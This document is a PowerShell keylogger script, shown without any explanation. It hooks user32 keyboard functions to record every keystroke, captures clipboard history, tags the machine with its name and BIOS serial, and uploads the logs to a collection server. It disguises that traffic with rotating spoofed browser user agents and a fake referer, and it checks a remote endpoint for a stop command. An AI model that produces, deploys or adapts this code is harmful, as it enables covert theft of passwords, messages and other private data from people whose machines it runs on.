Add-Type @"
using System;using System.Runtime.InteropServices;using System.Text;
public class W{
    [DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);
    [DllImport("user32.dll")]public static extern int GetKeyboardState(byte[] k);
    [DllImport("user32.dll")]public static extern int ToUnicode(uint v,uint s,byte[] k,StringBuilder b,int c,uint f);
}
"@
Add-Type -AssemblyName System.Windows.Forms
$n=@{8="[BACKSPACE]";9="[TAB]";13="[ENTER]";16="[SHIFT]";17="[CTRL]";18="[ALT]";32="[SPACE]"}
$sec=15
$d = "$($env:COMPUTERNAME)_$((Get-WmiObject Win32_BIOS).SerialNumber)"
$w="http://127.0.0.1:5000/upload_keylog"
$checkurl="http://127.0.0.1:5000/should_stop_keylogger?device_id=$d"
$clipboardHistory = @()

function Should-Stop {
    try {
        $resp = irm $checkurl -UseBasicParsing
        return $resp.stop
    } catch {
        return $false
    }
}
$userAgents = @(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Microsoft BITS/7.8"
)
while ($true) {
    $headers = @{
        "User-Agent" = $userAgents | Get-Random
        "Accept" = "application/json, text/javascript, */*; q=0.01"
        "Accept-Language" = "en-US,en;q=0.9"
        "Referer" = "https://www.google.com/"
    }
    if (Should-Stop) {
        while (Should-Stop) { Start-Sleep -Seconds 5 }
        continue
    }

    $k=@(); $p=@{}; $s=Get-Date
    while((Get-Date)-$s -lt [TimeSpan]::FromSeconds($sec)){
        Start-Sleep -Milliseconds 50
        $ks=New-Object byte[] 256    
        [W]::GetKeyboardState($ks) | Out-Null
        for($v=8; $v -le 255; $v++){
            if(([W]::GetAsyncKeyState($v) -band 0x8000) -ne 0 -and -not $p.ContainsKey($v)){
                $p[$v]=$true
                if($n.ContainsKey($v)){
                    $k += "K:$($n[$v])"
                }else{
                    $b=New-Object System.Text.StringBuilder 2
                    $r=[W]::ToUnicode([uint32]$v,0,$ks,$b,$b.Capacity,0)
                    if($r -gt 0){ $k += "K:$($b.ToString())" }
                }
            }elseif(-not(([W]::GetAsyncKeyState($v) -band 0x8000) -ne 0) -and $p.ContainsKey($v)){
                $p.Remove($v)
            }
        }
        try { $c = [Windows.Forms.Clipboard]::GetText() } catch { $c = "[Clipboard unavailable]" }
        if ($c -and ($clipboardHistory.Count -eq 0 -or $clipboardHistory[-1] -ne $c)) { $clipboardHistory += $c }
    }
    if (Should-Stop) { continue }
    $t = "Clipboard:`n" + ($clipboardHistory -join "`n") + "`n`nKeystrokes:`n" + ($k -join "`n")
    $f = "k_$($d)_$(Get-Date -f yyyyMMdd_HHmmss).txt"
    $b = [System.Guid]::NewGuid().ToString()
    $l = "`r`n"
    $bl = @("--$b","Content-Disposition: form-data; name=`"d`"$l",$d,"--$b","Content-Disposition: form-data; name=`"f1`"; filename=`"$f`"","Content-Type: text/plain$l",$t,"--$b--$l")
    $bd = $bl -join $l
    irm -Uri $w -Method Post -Body $bd -ContentType "multipart/form-data; boundary=$b" -Headers $headers -ErrorAction SilentlyContinue > $null 2>&1
    Remove-Variable k,t,p,f,b,bl,bd,s,v,ks,b,r -ErrorAction SilentlyContinue
    [System.GC]::Collect()
}